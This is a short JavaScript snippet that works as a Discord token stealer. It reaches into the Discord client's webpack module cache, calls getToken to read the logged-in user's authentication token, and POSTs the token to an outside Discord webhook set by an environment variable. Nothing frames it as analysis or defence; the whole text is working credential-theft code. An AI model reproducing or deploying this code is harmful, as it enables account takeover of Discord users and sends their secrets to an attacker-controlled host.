 var XMLHttpRequest = require('xhr2');

token=(webpackChunkdiscord_app.push([[""],{},e=>{m=[];for(let t in e.c)m.push(e.c[t])}]),m).find((e=>void 0!==e?.exports?.default?.getToken)).exports.default.getToken();
const request = new XMLHttpRequest();
      request.open("POST", process.env.webhookurl);

      request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "DiscordWebhook1",
        avatar_url: "",
        content: token
      }

      request.send(JSON.stringify(params));
